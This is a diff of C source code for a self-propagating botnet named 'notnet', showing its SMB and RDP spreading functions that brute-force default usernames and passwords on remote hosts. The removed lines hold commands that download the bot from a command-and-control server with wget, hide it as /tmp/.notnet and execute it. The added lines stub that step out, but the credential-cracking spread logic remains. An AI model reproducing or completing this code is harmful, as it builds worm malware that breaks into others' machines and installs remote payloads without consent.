@@ -332,12 +332,10 @@ int spread_smb(notnet_bot_t *bot, const char *ip, uint16_t port) {
             if (try_login_smb(ip, port, default_users[u], default_passes[p])) {
                 log_info("SMB: cracked %s:%d with %s:%s",
                          ip, port, default_users[u], "***REDACTED***");
-                
-                char cmd[512];
-                snprintf(cmd, sizeof(cmd),
-                    "echo '%s /tmp/.notnet && chmod +x /tmp/.notnet && /tmp/.notnet &' | at now + 1 minute",
-                    "wget http://...");
-                send_command(-1, "smb", cmd);
+                /* NOTE: SMB spreading provides auth confirmation only.
+                 * Full payload deployment requires SMB file upload +
+                 * scheduled task creation (not yet implemented). */
+                send_command(-1, "smb", "payload deployment not supported over SMB");
                 return 0;
             }
         }
@@ -494,12 +492,10 @@ int spread_rdp(notnet_bot_t *bot, const char *ip, uint16_t port) {
             if (try_login_rdp(ip, port, default_users[u], default_passes[p])) {
                 log_info("RDP: cracked %s:%d with %s:%s",
                          ip, port, default_users[u], "***REDACTED***");
-                
-                char cmd[512];
-                snprintf(cmd, sizeof(cmd),
-                    "wget http://%s:%d/bot/notnet -O /tmp/.notnet && chmod +x /tmp/.notnet && /tmp/.notnet &",
-                    bot->c2_http.server, PAYLOAD_DL_PORT);
-                send_command(-1, "rdp", cmd);
+                /* NOTE: RDP spreading provides auth confirmation only.
+                 * Full payload deployment requires RDP virtual channel
+                 * command injection (not yet implemented). */
+                send_command(-1, "rdp", "payload deployment not supported over RDP");
                 return 0;
             }
         }
